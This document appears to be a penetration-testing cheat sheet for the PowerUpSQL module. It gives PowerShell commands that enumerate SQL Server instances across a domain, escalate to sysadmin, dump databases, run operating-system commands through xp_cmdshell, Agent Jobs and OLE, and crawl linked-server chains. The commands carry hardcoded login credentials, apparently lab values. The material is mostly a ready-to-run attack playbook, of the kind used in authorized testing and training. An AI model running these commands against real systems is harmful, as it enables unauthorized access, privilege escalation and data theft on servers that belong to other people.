# 17.12 PowerUpSQL full

> Discover SQL instances domain-wide, audit vulns, escalate, run xp_cmdshell/Agent/OLE, and crawl linked-server chains with `PowerUpSQL`.

## Overview

PowerUpSQL automates MSSQL discovery and exploitation: enumerate instances domain-wide, audit for vulnerabilities, escalate privileges, run all three command-execution methods, and crawl linked server chains with query output.

## Steps

- Get-SQLInstanceDomain finds SQL servers via SPN; Get-SQLServerInfo gathers detail
- Invoke-SQLAudit identifies vulnerabilities; Invoke-SQLEscalatePriv auto-escalates to sysadmin
- Invoke-SQLDumpInfo exports databases/users/privileges to CSV files
- Invoke-SQLOSCmd uses xp_cmdshell; Invoke-SQLOSCmdAgentJob uses Agent Jobs; Invoke-SQLOSCmdOle uses OLE
- Get-SQLServerLinkCrawl discovers and queries all linked server chains
- Iterate $out with foreach to read CustomQuery DataRow results

## Commands

### Connect and query

```powershell
Import-Module .\PowerUpSQL.psm1
```

### Enumerate domain SQL instances

```powershell
Get-SQLInstanceDomain -Verbose
```

### Server info + audit

```powershell
Get-SQLServerInfo -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"
```

### All three OS command methods

```powershell
Invoke-SQLOSCmd -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Command "whoami"
```

### Link crawl + read query output

```powershell
$Out = Get-SQLServerLinkCrawl -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Query "SELECT SYSTEM_USER"
```
